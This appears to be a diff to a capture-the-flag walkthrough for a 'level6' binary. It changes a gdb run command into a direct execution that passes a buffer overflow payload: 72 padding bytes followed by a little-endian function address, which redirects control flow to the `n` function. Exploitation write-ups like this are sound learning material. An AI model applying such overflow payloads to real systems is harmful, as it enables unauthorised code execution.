@@ -44,6 +44,6 @@ Then we'll need to write the address of the `n` function
 > 0x08048468  m
 > ...
 
-> r $(python -c 'print "A" * 72 + "\x08\x04\x84\x54"[::-1]')
+> ./level6 $(python -c 'print "A" * 72 + "\x08\x04\x84\x54"[::-1]')
 
 And voila
